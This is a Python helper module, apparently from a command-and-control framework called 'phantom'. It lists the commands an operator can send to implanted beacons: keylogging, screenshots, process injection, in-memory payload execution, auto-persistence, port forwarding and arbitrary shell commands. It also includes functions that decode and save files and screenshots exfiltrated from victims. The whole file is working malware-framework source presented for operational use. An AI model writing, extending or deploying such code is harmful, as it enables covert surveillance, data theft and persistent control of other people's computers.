"""Helpers for C2 shell beacon interaction."""
import base64
import os
from datetime import datetime

from phantom.utils.paths import data_dir


BEACON_COMMANDS = """
[bold]Recon:[/]     recon, ls/dir, drives, find, sysinfo, netinfo, processes, pwd, cd, cat, whoami
[bold]Transfer:[/]  download <path>  |  upload <path> <base64>
[bold]Network:[/]   portfwd <local> <remote_host> <remote_port>  |  portfwd-stop
[bold]Keylog:[/]    keylog start|stop|dump  [dim](Windows only)[/]
[bold]Screenshot:[/] screenshot  [dim](Windows only)[/]
[bold]Injection:[/] inject <pid> | migrate <pid> | mem-run <b64> [dim](Windows only)[/]
[bold]Persistence:[/] autopersist  [dim](Auto-detect)[/]
[bold]Shell:[/]     shell <cmd>  |  any OS command
[bold]Config:[/]    sleep <ms>  |  exit/kill
"""


def save_beacon_download(b64_data: str, suggested_name: str = "") -> str:
    """Decode base64 file data from beacon and save to data/downloads/."""
    out_dir = os.path.join(data_dir(), "downloads")
    os.makedirs(out_dir, exist_ok=True)
    name = suggested_name or f"beacon_{datetime.now().strftime('%Y%m%d_%H%M%S')}.bin"
    name = os.path.basename(name.replace("\\", "/"))
    path = os.path.join(out_dir, name)
    data = base64.b64decode(b64_data)
    with open(path, "wb") as f:
        f.write(data)
    return path


def format_beacon_output(output: str) -> tuple[str, str]:
    """
    Process beacon task output. Returns (display_text, extra_info).
    Auto-saves FILE_B64 downloads and SCREENSHOT_B64 captures.
    """
    if output.startswith("FILE_B64:"):
        try:
            path = save_beacon_download(output[9:])
            size = os.path.getsize(path)
            return f"[File downloaded — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[File decode failed: {e}]", ""
            
    if output.startswith("SCREENSHOT_B64:"):
        try:
            # Screenshots are saved as BMP by default from the beacon
            path = save_beacon_download(output[15:], suggested_name=f"screenshot_{datetime.now().strftime('%H%M%S')}.bmp")
            size = os.path.getsize(path)
            return f"[Screenshot captured — {size} bytes]", f"Saved to: {path}"
        except Exception as e:
            return f"[Screenshot decode failed: {e}]", ""
            
    return output, ""
